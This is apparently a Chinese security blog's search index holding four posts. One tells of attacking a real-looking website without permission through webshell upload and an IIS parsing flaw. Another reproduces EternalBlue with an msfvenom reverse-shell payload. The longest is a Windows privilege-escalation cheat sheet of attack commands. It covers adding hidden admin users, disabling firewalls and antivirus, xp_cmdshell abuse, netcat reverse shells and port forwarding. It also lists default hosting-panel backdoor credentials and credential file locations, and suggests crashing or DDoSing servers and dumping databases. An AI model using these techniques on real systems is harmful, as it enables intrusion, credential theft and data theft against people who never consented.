<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title></title>
      <url>/2017/05/16/%E5%8F%8B%E6%83%85%E6%B5%8B%E8%AF%95--tnpm/</url>
      <content type="html"><![CDATA[<hr>
<h2 id="title：-友情测试"><a href="#title：-友情测试" class="headerlink" title="title： 友情测试"></a>title： 友情测试</h2><p>上课无聊，断开了教师机控制，插入U盘读取一波工具友情找了某个网站测试了一波性能。</p>
<hr>
<p>网站类型：<code>IIS7.5+伪静态(PHP)+WINNT+WAF2.0</code><br>IP：    <code>183.61.**.**</code><br>…<br><a id="more"></a><br><img src="http://i.imgur.com/LGlt7id.png" alt=""></p>
<h2 id="过程0x1"><a href="#过程0x1" class="headerlink" title="过程0x1"></a>过程0x1</h2><p>注册：上传文件获取shell<br>搜索框：具有注入效应（后被发现注入失败。）<br>下载：越权下载文件</p>
<p>伪注册了个邮箱：<br>选择了张PHP类型JPG图片马上传，<br>经过抓包修改后缀–&gt;失败，服务器端有验证后缀<br>修改mine和后缀–&gt;失败，服务器端双重验证<br>； –&gt;失败，把我分号后面的去掉了，然后再验证后缀名<br>00阶段–&gt;失败，我也不知道怎么就失败了。。忘了<br>传图片（内容是马）–&gt;失败，被WAF拦截了。<br>传图片马（马和图片融合，利用命令行）–&gt;当然也失败，，虽然知道结果依然是这样。。</p>
<h2 id="过程0x2"><a href="#过程0x2" class="headerlink" title="过程0x2"></a>过程0x2</h2><p>最后下面：<br>上多几个过狗马（JPG），上到第3张，貌似成功了。读取到了图片，但是利用是个问题，，因为图片不可能解析，看了下以前的文章，发现博客有个IIS7.x（uginx也有此漏洞）的解析漏洞，<br>qq.jpg/.php（在图片URL后面加/.php）<br>成功使JPG运行了PHP代码</p>
<p><img src="http://i.imgur.com/lXO0Vx8.png" alt=""></p>
<h2 id="过程0x3"><a href="#过程0x3" class="headerlink" title="过程0x3"></a>过程0x3</h2><p>好了，明天有空再更新提权吧。。该睡觉了。（听说ISCC又出新题了，，干他娘的。）</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLMAP 网页版命令生成器]]></title>
      <url>/2017/05/15/SQLMAP%E7%BD%91%E9%A1%B5%E7%89%88%E5%91%BD%E4%BB%A4%E7%94%9F%E6%88%90%E5%99%A8/</url>
      <content type="html"><![CDATA[<p>　　白天上课，晚上练车我竟然还能抽出时间来搞ISCC？搞笑，我还能抽出时间泡妞呢。<br>　　说笑了。<br><a id="more"></a><br>　　挺感慨这次的ISCC的，虽然还没结束，但是想起上一次我800分就被拉去决赛的我顿时心里充满激动。反而这次的2485分（目前满分3850）竟然连100名都进不了，，这是什么鬼。。<br>　　不过收获要是蛮多了，特别是代码审计和上传。等比赛后再写篇writeup记录下此次失败的比赛吧。<br>　　唉，累了，逛逛博客，发现SQLMAP网页版懒人必备命令生成器分享下，仔细研究的话发现原来QLMAP的命令是如此的多，，</p>
<p><img src="http://i.imgur.com/1s83YIM.png" alt=""></p>
<p>主要用于SQLMAP命令懒得手打的我。同时也能通过此网页学习更多限量级命令。</p>
<p>文件下载：<a href="https://pan.baidu.com/s/1skMR47N" target="_blank" rel="external">https://pan.baidu.com/s/1skMR47N</a><br>密码：6666</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[方程式 Eternalblue 漏洞利用复现]]></title>
      <url>/2017/04/29/%E6%96%B9%E7%A8%8B%E5%BC%8F%20Eternalblue%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2000/xpSp0/1/2/3/2003Sp0/1/2/3、VistaSp0/1/2/2008Sp1/2/xp_x86Sp0/1/2/3xp_x64Sp1/2/2003ServerSp0/1/2/Server2008Sp0/1/2/win7Sp0/1/Server2008R20/1/Win8Sp0/Server2012Sp0</div></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1.开启了445端口即可。<br>2.大多数版本需要关闭防火墙。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理:"></a>漏洞原理:</h2><p><a href="http://www.91ri.org/16946.html" target="_blank" rel="external">http://www.91ri.org/16946.html</a><br>(我看了半天愣是没看懂)<br>然后找了个比较简明的看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">首先SrvOs2FeaListToNt首先调用SrvOs2FeaListSizeToNt计算pNtFea的大小。这里注意了SrvOs2FeaListSizeToNt函数会修改原始的pOs2Fea中的Length大小,本来Length是一个DWORD, 代码还强制转换成了WORD,不能不让人联想一些事。然后以计算出来的Length来分配pNtFea.最后调用SrvOs2FeaToNt来实现转换。SrvOs2FeaToNt后面的判断就有问题了。这里还不止一个问题。 </div><div class="line">1. 转换完成后，增加pOs2FeaBody然后比较。正确的逻辑难道不应该是先判断再转换吗？ </div><div class="line">2. 由于SrvOs2FeaListSizeToNt中改变了pOs2Fea的length的值，这里使用变大后的值做比较，肯定会越界。</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机：<br>Win7 旗舰版 x64 关闭防火墙 IP：192.168.26.129 开放445端口<br>攻击机A：<br>win7 旗舰版 x64 python2.6（32位）、对应的pywin32 IP :192.168.26.129<br>攻击机B：<br>kali2.0/任意安装了msf的Linux/可以被反弹获取后门权限的设备<br>这里我用的是kali2.0 IP:192.168.26.128</p>
<p><strong>（没错，靶机和攻击机A是同一台，因为电脑配置渣，开不起第三台我就双向利用了。）</strong></p>
<p>exp下载链接：<a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="external">https://github.com/misterch0c/shadowbroker</a> </p>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>1.在攻击机A安装好<code>python-2.6.6.msi</code>，<code>pywin32-221.win32-py2.6.exe</code></p>
<p>2.在攻击机B先生成一个payload。启动MSF。因为靶机为win7、X64位。<br>启动后对应的命令为:<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.26.128 LPORT=5555 -f dll &gt;test.dll</code><br>（注意创建的）</p>
<p>3.把生成的payload传给攻击机A。</p>
<p>4.打开EXP。即fb.py(现在根目录创建listeningposts文件，或者打开fb.py注释有关listeningposts的条目)</p>
<p>输入：<br><img src="http://i.imgur.com/wD2LNdg.png" alt=""></p>
<p>5.跳到fb后输入:<br><img src="http://i.imgur.com/6qrYJwq.png" alt=""></p>
<p>6.一直回车确定，直到出现<br><img src="http://i.imgur.com/nu4YPtO.png" alt=""></p>
<p>7.一直回车，直到出现如图，开始跳到Doublepulsar模块<br><img src="http://i.imgur.com/Gpv3SrA.png" alt=""></p>
<p>8.一直回车，直到出现如图再选择：<br><img src="http://i.imgur.com/RAhw4yS.png" alt=""></p>
<p>9.一直回车，直到出现<br><img src="http://i.imgur.com/G9AXXTu.png" alt=""></p>
<p>10.返回攻击机A，查看msf,发现已成功反弹，执行shell命令。<br><img src="http://i.imgur.com/IbrCWwJ.png" alt=""></p>
<p>11.成功得到System的权限并使用CMD命令进行相应操作。<br><img src="http://i.imgur.com/WxgakuR.png" alt=""></p>
<h2 id="得到的反弹shell还可执行的其它操作"><a href="#得到的反弹shell还可执行的其它操作" class="headerlink" title="得到的反弹shell还可执行的其它操作"></a>得到的反弹shell还可执行的其它操作</h2><p>1.在第10步输入help，可查看此shell能执行的操作<br>screenshot  截图桌面<br>webcam_snap  拍照功能。</p>
<p>。。。</p>
<h2 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h2><p>利用命令开3389，并且创建隐藏账户<br>利用system权限远程下载一个远控</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[提权技巧]]></title>
      <url>/2017/04/26/%E6%8F%90%E6%9D%83/</url>
      <content type="html"><![CDATA[<p>提权：在我们拿到一个webshell之后，我们需要得到服务器的权限，从webshell权限到服务器的权限是一种提权。<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而当我们是一个普通用户的时候，提升到服务器的超级用户的过程，这也是一种提权。<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般我们都是使用菜刀的功能(虚拟终端)提权<br><a id="more"></a></p>
<hr>
<p>1.cmd拒绝访问就自己上传一个cmd.exe，自己上传的cmd是不限制后缀的，还可以是cmd.com cmd.txt cmd.rar</p>
<p>2.net user不能执行有时候是net.exe被删除了，可以先试试net1，不行就自己上传一个net.exe</p>
<p>3.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\RECYCLER\pr.exe，命令那里清空(包括/c )输入”net user key daxia /add”</p>
<p>4.有时候因为监控而添加用户失败，试试上传“PwDump7 破解当前管理密码(hash值)”俩个都上传，执行PwDump7.exe就可以了，之后解密哈希值得到铭文，建</p>
<p>议重定向结果到保存为1.txt /c c:\windows\temp\cookies\PwDump7.exe &gt;1.txt</p>
<p>5.有时候权限很松，很多命令都可以执行，但是就是增加不上用户，这时候你就要考虑是不是因为密码过于简单或是过于复杂了</p>
<p>6.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令</p>
<p>7.有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators</p>
<p>8.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：””c:\xxx\exp.exe “whoami”  记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在</p>
<p>cmd那里，下面不变</p>
<p>9.当添加不上用户却可以添加“增加用户的Vbs、bat）的时候，就添加一个吧，然后用“直接使服务器蓝屏重启的东东”让服务器重启就提权成功</p>
<p>10.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:\windows\temp\cmd.exe 设置终端路径为：c:\windows\temp\cmd.exe</p>
<p>11.支持aspx但跨不了目录的时候，可以上传一个读iis的vbs，执行命令列出所有网站目录，找到主站的目录就可以跨过去了，上传cscript.exe到可执行目录，</p>
<p>接着上传iispwd.vbs到网站根目录，cmd命令/c “c:\windows\temp\cookies\cscript.exe” d:\web\iispwd.vbs</p>
<p>11.如何辨别服务器是不是内网？192.168.x.x  172.16.x.x  10.x.x.x</p>
<p>12.安全狗下加用户的语句：：for /l %i in (1,1,1000) do @net user test test /add&amp;@net localgroup administrators test /add</p>
<p>13.21对应的FTP、1433对应的MSSQL、3306对应的MYSQL、3389对应的远程桌面、1521对应的Oracle、5631对应的pcanywhere</p>
<p>14.劫持提权，说到这个，想必肯定会想到lpk.dll这类工具，有时候在蛋疼怎么都加不上账户的时候，可以试试劫持shift、添加开机启动等等思路</p>
<p>15.提权成功但3389端口没开，执行语句或是工具开3389失败的时候，可以上传rootkit.asp，登陆进去就是system权限，这时候再尝试开3389希望较大</p>
<h2 id="常用DOS命令"><a href="#常用DOS命令" class="headerlink" title="常用DOS命令"></a>常用DOS命令</h2><p>查看版本：ver</p>
<p>查看权限：whoami</p>
<p>查看配置：systeminfo</p>
<p>查看用户：net user</p>
<p>查看进程：tasklist</p>
<p>查看正在运行的服务：tasklist /svc</p>
<p>查看开放的所有端口：netstat -ano</p>
<p>查询管理用户名：query user</p>
<p>查看搭建环境：ftp 127.0.0.1</p>
<p>查看指定服务的路径：sc qc Mysql</p>
<p>添加一个用户：net user key key001 /add</p>
<p>提升到管理权限：net localgroup administrators key /add</p>
<p>添加用户并提升权限：net user key key001 /add &amp; net localgroup administrators key /add</p>
<p>查看制定用户信息：net user key</p>
<p>查看所有管理权限的用户：net localgroup administrators</p>
<p>加入远程桌面用户组：net localgroup “Remote Desktop Users” key /add</p>
<p>突破最大连接数：mstsc /admin /v:127.0.0.1</p>
<p>删除用户：net user key /del</p>
<p>删除管理员账户:net user administrator key001</p>
<p>更改系统登陆密码：net password key001</p>
<p>激活GUEST用户：net user guest /active:yes</p>
<p>开启TELNET服务：net start telnet</p>
<p>关闭麦咖啡：net stop “McAfee McShield”</p>
<p>关闭防火墙：net stop sharedaccess</p>
<p>查看当前目录的所有文件：dir c:\windows\</p>
<p>查看制定文件的内容：type c:\windows\1.asp</p>
<p>把cmd.exe复制到c:\windows的temp目录下并命名为cmd.txt：copy c:\windows\temp\cookies\cmd.exe c:\windows\temp\cmd.txt</p>
<p>开3389端口的命令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</p>
<p>查看补丁：dir c:\windows>a.txt&amp;(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log</p>
<p>KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find /i “%i”||@echo%i Not Installed!)&amp;del /f /q</p>
<p>/a a.txt</p>
<h2 id="常见杀软"><a href="#常见杀软" class="headerlink" title="常见杀软"></a>常见杀软</h2><p>360tray.exe        360实时保护<br>ZhuDongFangYu.exe  360主动防御<br>KSafeTray.exe        金山卫士<br>McAfee McShield.exe  麦咖啡<br>SafeDogUpdateCenter.exe  服务器安全狗</p>
<h2 id="windows提权中敏感目录和敏感注册表的利用"><a href="#windows提权中敏感目录和敏感注册表的利用" class="headerlink" title="windows提权中敏感目录和敏感注册表的利用"></a>windows提权中敏感目录和敏感注册表的利用</h2><p>敏感目录               目录权限           提权用途</p>
<p>C:\Program Files\                                          默认用户组users对该目录拥有查看权        可以查看服务器安装的应用软件<br>C:\Documents and Settings\All Users\「开始」菜单\程序       Everyone拥有查看权限          存放快捷方式，可以下载文件，属性查看安装路径<br>C:\Documents and Settings\All Users\Documents              Everyone完全控制权限                    上传执行cmd及exp<br>C:\windows\system32\inetsrv\                               Everyone完全控制权限                    上传执行cmd及exp<br>C:\windows\my.iniC:\Program Files\MySQL\MySQL Server 5.0\my.ini  默认用户组users拥有查看权限        安装mysql时会将root密码写入该文件<br>C:\windows\system32\                                       默认用户组users拥有查看权限   Shift后门一般在该文件夹，可以下载后门破解密码<br>C:\Documents and Settings\All Users\「开始」菜单\程序\启动  Everyone拥有查看权限         可以尝试向该目录写入vbs或bat，服务器重启后运行<br>C:\RECYCLER\D:\RECYCLER\                                   Everyone完全控制权限                     回收站目录。常用于执行cmd及exp<br>C:\Program Files\Microsoft SQL Server\                     默认用户组users对该目录拥有查看权限       有时候该目录也存在可执行权限<br>C:\Program Files\MySQL\                                    默认用户组users对该目录拥有查看权限       找到MYSQL目录中user.MYD里的root<br>C:\oraclexe\                                               默认用户组users对该目录拥有查看权限       可以尝试利用Oracle的默认账户提权<br>C:\WINDOWS\system32\config                                 默认用户组users对该目录拥有查看权限       尝试下载sam文件进行破解提权<br>C:\Program Files\Geme6 FTP Server\Remote Admin\Remote.ini  默认用户组users对该目录拥有查看权限       Remote.ini文件中存放着G6FTP的密码<br>c:\Program Files\RhinoSoft.com\Serv-U\c:\Program Files\Serv-U\  默认用户组users对该目录拥有查看权限  ServUDaemon.ini 中存储了虚拟主机网站路径和密码<br>c:\windows\system32\inetsrv\MetaBase.xml                   默认用户组users对该目录拥有查看权限       IIS配置文件 C:tomcat5.0\conf\resin.conf                                默认用户组users对该目录拥有查看权限       Tomat存放密码的位置<br>C:\ZKEYS\Setup.ini                                         默认用户组users对该目录拥有查看权限       ZKEYS虚拟主机存放密码的位置</p>
<h2 id="提权中的敏感注册表位置"><a href="#提权中的敏感注册表位置" class="headerlink" title="提权中的敏感注册表位置"></a>提权中的敏感注册表位置</h2><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSSQLServer\MSSQLServer\SuperSocketNetLib\Tcp             Mssql端口 </p>
<p>HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server DenyTSConnections                         远程终端 值为0 即为开启 </p>
<p>HKEY_LOCAL_MACHINE\SOFTWARE\MySQL AB\                                                           mssql的注册表位置 </p>
<p>HKEY_LOCAL_MACHINE\SOFTWARE\HZHOST\CONFIG\                                                      华众主机注册表配置位置 </p>
<p>HKEY_LOCAL_MACHINE\SOFTWARE\Cat Soft\Serv-U\Domains\1\UserList\                                 serv-u的用户及密码（su加密）位置</p>
<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\ WinStations\RDP-Tcp    在该注册表位置PortNumber的值即位3389端口值 </p>
<p>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers                               mysql管理工具Navicat的注册表位置，提权运用请谷歌 </p>
<p>HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters                              Radmin的配置文件，提权中常将其导出进行进行覆盖提权 </p>
<p>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\MSFtpsvc\Parameters\Virtual Roots\      IIS注册表全版本泄漏用户路径和FTP用户名漏洞 </p>
<p>HKEY_LOCAL_MACHINE\software\hzhost\config\Settings\mastersvrpass                           华众主机在注册表中保存的mssql、mysql等密码 </p>
<p>HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN\11                                    星外主机mssql的sa账号密码，双MD5加密 </p>
<p>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\MSFtpsvc\Parameters\Virtual Roots\ControlSet002  星外ftp的注册表位置，当然也包括ControlSet001、ControlSet003。</p>
<h2 id="SQL语句直接开启3389"><a href="#SQL语句直接开启3389" class="headerlink" title="SQL语句直接开启3389"></a>SQL语句直接开启3389</h2><p>3389登陆关键注册表位置：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\DenyTSConnections</p>
<p>其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。</p>
<p>而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。</p>
<p>开启3389的SQL语句： syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal</p>
<p>Server’,’fDenyTSConnections’,’REG_DWORD’,0;–</p>
<p>关闭3389的SQL语句： syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal</p>
<p>Server’,’fDenyTSConnections’,’REG_DWORD’,1;–</p>
<p>2003可以实现一句话开3389： reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /v PortNumber /t REG_DWORD /d 80 /f</p>
<h2 id="wscript-shell的删除和恢复"><a href="#wscript-shell的删除和恢复" class="headerlink" title="wscript.shell的删除和恢复"></a>wscript.shell的删除和恢复</h2><p>卸载wscript.shell对象，在cmd下或直接运行：regsvr32 /u %windir%\system32\WSHom.Ocx<br>卸载FSO对象，在cmd下或直接运行：regsvr32.exe /u %windir%\system32\scrrun.dll<br>卸载stream对象，在cmd下或直接运行：regsvr32 /s /u “C:\ProgramFiles\CommonFiles\System\ado\msado15.dll”   如果想恢复的话只需要去掉/U 即可重新再注册以上相关ASP组件，这样子就可以用了</p>
<h2 id="如何找到准确的终端连接端口？"><a href="#如何找到准确的终端连接端口？" class="headerlink" title="如何找到准确的终端连接端口？"></a>如何找到准确的终端连接端口？</h2><p>在aspx大马里，点击“系统信息”第三个就是目前的3389端口或是执行命令查看正在运行的服务：tasklist /svc<br>找到：svchost.exe         1688  TermService<br>记住1688这个ID值，查看开放的所有端口：netstat -ano<br>找到1688这个ID值所对应的端口就是3389目前的端口</p>
<h2 id="iis6提权提示Can-not-find-wmiprvse-exe的突破方法"><a href="#iis6提权提示Can-not-find-wmiprvse-exe的突破方法" class="headerlink" title="iis6提权提示Can not find wmiprvse.exe的突破方法"></a>iis6提权提示Can not find wmiprvse.exe的突破方法</h2><p>突破方法一：<br>在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的，进程查看里面直接K掉</p>
<p>在结束之后，它会再次运行，这时候的PID值的不一样的，这时候我们回来去运行exp，直接秒杀。</p>
<p>突破方法二：<br>虚拟主机，一般权限严格限制的，是没权限结束的，这时候我们可以考虑配合其他溢出工具让服务器强制重启，比如“直接使服务器蓝屏重启的东东”</p>
<p>甚至可以暴力点，DDOS秒杀之，管理发现服务器不通了首先肯定是以为服务器死机，等他重启下服务器（哪怕是IIS重启下）同样秒杀之。</p>
<h2 id="本地溢出提权"><a href="#本地溢出提权" class="headerlink" title="本地溢出提权"></a>本地溢出提权</h2><p>计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了.</p>
<p>缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的.</p>
<p>利用一些现成的造成溢出漏洞的exploit通过运行,把用户从users组或其它系统用户中提升到administrators组.</p>
<p>想要执行cmd命令，就要wscript.shell组建支持，或是支持aspx脚本也行，因为aspx脚本能调用.net组件来执行cmd的命令.</p>
<h2 id="Mssql提权"><a href="#Mssql提权" class="headerlink" title="Mssql提权"></a>Mssql提权</h2><p>扫描开放的端口，1433开了就可以找sa密码提权，用大马里的搜索文件功能，sa密码一般在conn.asp config.asp web.config 这三个文件</p>
<p>也可以通过注册表找配置文件，看下支持aspx不，支持的话跨目录到别的站点上找，找到之后用aspshell自带的sql提权登录再执行命令创建用户即可。</p>
<p>aspx马提权执行命令有点不一样，点击数据库管理–选MSSQL–server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB–输入帐号密码连接即</p>
<p>可</p>
<p>增加一个用户：exec master.dbo.xp_cmdshell ‘net user key key001 /add’;– 提升为管理员：exec master.dbo.xp_cmdshell ‘net localgroup administrators key /add’;–</p>
<p>PS:如果增加不上，说明是xp_cmdshell组建没有，增加xp_cmdshell组建命令：Use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’)</p>
<p>1433一句话开3389： Exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal</p>
<p>Server’,’fDenyTSConnections’,’REG_DWORD’,0;–</p>
<h2 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h2><p>利用mysql提权的前提就是,服务器安装了mysql，mysql的服务没有降权，是默认安装以系统权限继承的(system权限).并且获得了root的账号密码</p>
<p>如何判断一台windows服务器上的mysql有没有降权？ cmd命令net user 如果存在 mysql mssql这样用户或者类似的.通常就是它的mssql mysql服务已经被降权运行了</p>
<p>如何判断服务器上是否开启了mysql服务？ 开了3306端口，有的管理员会把默认端口改掉.另一个判断方法就是网站是否支持php,一般支持的话都是用mysql数据库的.</p>
<p>如何查看root密码？ 在mysql的安装目录下找到user.myd这个文件，连接信息就在里面，一般是40位cmd加密，一些php网站安装的时候用的是root用户，在conn.asp config.asp这</p>
<p>些文件里，可以用PHP脚本的文件搜索功能搜索这两个文件，找到之后编辑就可以找到连接信息，有时会显得很乱，这时就需要自己去组合，前17位在第一行可以</p>
<p>找到，还有23位在第三行或是其他行，自己继续找。</p>
<p>可以直接用php脚本里“mysql执行”，或是上传个UDF.php，如果网站不支持PHP，可以去旁一个php的站，也可以把UDF.php上传到别的phpshell上也可以。</p>
<p>填入帐号密码之后，自然就是安装DLL了，点击“自动安装Mysql BackDoor” 显示导出跟创建函数成功后，紧接着执行增加用户的命令即可。</p>
<p>PS：5.0版本以下(包括5.0的)默认c:\windows\系统目录就可以了，5.1版本以上的不能导出到系统目录下创建自定义函数，只能导出在mysql安装目录下的</p>
<p>lib/plugin目录中，例如：D:/Program Files/MySQL/MySQL Server 5.1/lib/plugin/mysql.dll</p>
<h2 id="serv-u提权"><a href="#serv-u提权" class="headerlink" title="serv-u提权"></a>serv-u提权</h2><p>这个文件里包含serv-u的md5密码：C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini</p>
<p>找到这个文件：ServUDaemon.ini 打开找到：LocalSetupPassword=nqFCE64E0056362E8FCAF813094EC39BC2</p>
<p>再拿md5密文去解密，再用现在的密码登陆提权即可。</p>
<p>serv-u提权的前提是43958端口开了，且知道帐号密码！</p>
<p>如果帐号密码默认，直接用shell里面的serv-u提权功能即可搞定，建议用aspx马、php马去提权，因为可以看回显。</p>
<p>530说明密码不是默认的,回显330说明成功，900说明密码是默认的</p>
<p>在程序里找个快捷方式，或是相关的文件进行下载到本地，再查看文件的属性，就可以找到serv-u的安装目录了。</p>
<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>什么情况下适合转发端口？</p>
<p>1.服务器是内网，我们无法连接。 2.服务器上有防火墙，阻断我们的连接。</p>
<p>转发端口的前提，我们是外网或是有外网服务器。</p>
<p>找个可读可写目录上传lcx.exe</p>
<p>本地cmd命令：lcx.exe -listen 1988 4567  （监听本地1988端口并转发到4567端口）</p>
<p>接着shell命令：/c c:\windows\temp\cookies\lcx.exe -slave 本机ip 1988 服务器ip 3389  （把服务器3389端口转发到本地4567端口）</p>
<p>之后本地连接：127.0.0.1:4567  (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了)</p>
<p>以上是本机外网情况下操作，接着说下在外网服务器里如何操作：</p>
<p>上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567</p>
<p>接着在aspx shell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了。</p>
<h2 id="NC反弹提权"><a href="#NC反弹提权" class="headerlink" title="NC反弹提权"></a>NC反弹提权</h2><p>当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。</p>
<p>不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….</p>
<p>找个可读可写目录上传nc.exe cmd.exe</p>
<p>-l  监听本地入栈信息</p>
<p>-p  port打开本地端口</p>
<p>-t  以telnet形式应答入栈请求</p>
<p>-e  程序重定向</p>
<p>本地cmd执行：nc -vv -l -p 52 进行反弹</p>
<p>接着在shell里执行命令：c:\windows\temp\nc.exe -vv 服务器ip 999 -e c:\windows\temp\cmd.exe 最好是80或8080这样的端口，被防火墙拦截的几率小</p>
<p>很多</p>
<p>执行成功后本地cmd命令：cd/  （只是习惯而已）</p>
<p>接着以telnet命令连接服务器：telnet 服务器ip 999</p>
<p>回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！</p>
<p>PS：一般这样的格式执行成功率很小，不如直接在cmd那里输入：c:\windows\temp\nc.exe 命令这里输入：-vv 服务器ip 999 -e c:\windows\temp\cmd.exe</p>
<p>这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的</p>
<h2 id="星外提权"><a href="#星外提权" class="headerlink" title="星外提权"></a>星外提权</h2><p>如何知道是不是星外主机？</p>
<p>第一：网站物理路径存在“freehost” 第二：asp马里点击程序，存在“7i24虚拟主机管理平台”“星外主机”之类的文件夹</p>
<p>默认帐号：freehostrunat 默认密码：fa41328538d7be36e83ae91a78a1b16f!7</p>
<p>freehostrunat这个用户是安装星外时自动建立的，已属于administrators管理组，而且密码不需要解密，直接登录服务器即可</p>
<p>（ee.exe提权法）</p>
<p>找个可读可写目录上传ee.exe</p>
<p>cmd命令：/c c:\windows\temp\cookies\ee.exe -i  （获取星外帐号的id值，例如回显：FreeHost ID：724）</p>
<p>接着命令：/c c:\windows\temp\cookies\ee.exe -u 724  （获取星外的帐号密码）</p>
<p>（vbs提权法）</p>
<p>找个可读可写目录上传cscript.exe和iispwd.vbs</p>
<p>cmd执行：/c “c:\windows\temp\cookies\cscript.exe” c:\windows\temp\cookies\iispwd.vbs</p>
<p>意思是读取iis，这样一来，不但可以获取星外的帐号密码，还可以看到同服务器上的所有站点的目录</p>
<h2 id="360提权"><a href="#360提权" class="headerlink" title="360提权"></a>360提权</h2><p>找个可读可写目录上传360.exe</p>
<p>cmd命令：/c c:\windows\temp\cookies\360.exe</p>
<p>会提示3段英文：   360 Antivirus Privilege Escalation Exploit By friddy 2010.2.2   You will get a Shift5 door!   Shift5 Backdoor created!   这是成功的征兆，接着连接服务器连按5下shift键，将弹出任务管理器，点击新建任务：explorer.exe 会出现桌面，接下来大家都会弄了……</p>
<h2 id="华众虚拟主机提权"><a href="#华众虚拟主机提权" class="headerlink" title="华众虚拟主机提权"></a>华众虚拟主机提权</h2><p>就经验来说，一般溢出提权对虚拟主机是无果的，而且华众又没有星外那么明显的漏洞</p>
<p>所以华众提权关键之处就是搜集信息，主要注册表位置：</p>
<p>HKEY_LOCAL_MACHINE\SOFTWARE\HZHOST\CONFIG\ HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mysqlpass     root密码 HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mssqlpss       sa 密码</p>
<p>c:\windows\temp 下有hzhost主机留下的ftp登陆记录有用户名和密码</p>
<p>以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用</p>
<p>百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具</p>
<h2 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h2><p>Access数据库脱库很简单，直接下载数据库即可，mssql数据库可以用shell自带的脱裤功能，找到数据库的连接信息，一般在web.config.asp里，然后连接一</p>
<p>下SA，找到会员表（UserInfo）就可以了。</p>
